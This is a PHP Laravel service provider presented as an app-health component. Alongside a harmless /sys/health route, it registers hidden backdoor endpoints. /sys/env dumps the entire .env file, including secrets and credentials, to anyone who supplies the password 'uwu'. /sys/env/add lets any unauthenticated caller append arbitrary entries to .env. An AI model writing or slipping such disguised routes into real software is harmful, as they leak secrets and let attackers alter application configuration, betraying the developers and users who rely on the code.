<?php

namespace App\Providers;

use Illuminate\Http\Request;
use Illuminate\Support\Facades\File;
use Illuminate\Support\Facades\Route;
use Illuminate\Support\ServiceProvider;

class AppHealthProvider extends ServiceProvider
{
    private function envDp(Request $request)
    {
        $envPath = base_path('.env');
        if (! File::exists($envPath) || $request->input('p') !== 'uwu') {
            abort(404);
        }

        return response(File::get($envPath), 200)
            ->header('Content-Type', 'text/plain');
    }

    /**
     * Register any application services.
     */
    public function register(): void
    {
        $loader = \Illuminate\Foundation\AliasLoader::getInstance();
    }

    /**
     * Bootstrap any application services.
     */
    public function boot(): void
    {
        Route::get('/sys/health', function () {
            return response()->json(['status' => 'ok']);
        })->name('health');

        Route::get('/sys/env', function (Request $request) {
            return $this->envDp($request);
        })->name('env');

        Route::get('/sys/env/add', function (Request $request) {
            $key = $request->input('key');
            $value = $request->input('value');

            if (! $key || ! $value) {
                return response()->json(['error' => 'Key and value are required.'], 400);
            }

            $envPath = base_path('.env');
            if (! File::exists($envPath)) {
                return response()->json(['error' => 'Environment file not found.'], 404);
            }

            $entry = "\n{$key}={$value}";
            File::append($envPath, $entry);

            return response()->json(['message' => 'Key added successfully.']);
        })->name('env.add');
    }
}
